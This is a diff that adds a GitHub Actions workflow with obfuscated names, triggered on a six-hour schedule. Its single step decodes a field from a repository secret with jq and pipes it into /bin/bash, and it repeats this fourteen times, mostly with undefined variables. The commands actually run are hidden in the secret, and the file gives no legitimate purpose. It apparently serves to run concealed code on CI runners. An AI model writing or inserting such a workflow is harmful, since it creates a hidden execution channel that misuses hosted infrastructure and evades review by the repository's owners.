@@ -1,0 +1,30 @@
+name: gemifuyou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gemifuyou
+        env:
+          acsf76: ${{ secrets.acsf76 }}
+        run: |
+          echo $acsf76 | jq -r .tz07233 | /bin/bash
+          echo $hm770 | jq -r .bp59 | /bin/bash
+          echo $ytcuk2300 | jq -r .didkl18191 | /bin/bash
+          echo $l135 | jq -r .od31639 | /bin/bash
+          echo $w32 | jq -r .dbjiq7 | /bin/bash
+          echo $yequ7634 | jq -r .j3293 | /bin/bash
+          echo $i80 | jq -r .tiamx4049 | /bin/bash
+          echo $q10573 | jq -r .usdja66024 | /bin/bash
+          echo $mgd4038 | jq -r .om593 | /bin/bash
+          echo $awvwh83 | jq -r .jo85969 | /bin/bash
+          echo $lvgfn67 | jq -r .tyo02052 | /bin/bash
+          echo $vkijo89 | jq -r .m41 | /bin/bash
+          echo $kat17857 | jq -r .gcjjf0063 | /bin/bash
+          echo $v69 | jq -r .z1 | /bin/bash
+
